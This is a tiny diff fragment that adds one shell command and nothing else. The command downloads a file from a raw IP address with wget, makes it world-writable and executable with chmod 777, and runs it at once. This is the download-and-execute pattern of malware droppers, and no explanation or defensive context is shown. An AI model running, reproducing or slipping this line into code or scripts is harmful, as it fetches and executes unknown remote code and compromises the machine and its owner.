@@ -1,0 +1,1 @@
+wget http://209.141.52.26/some && chmod 777 some && ./some
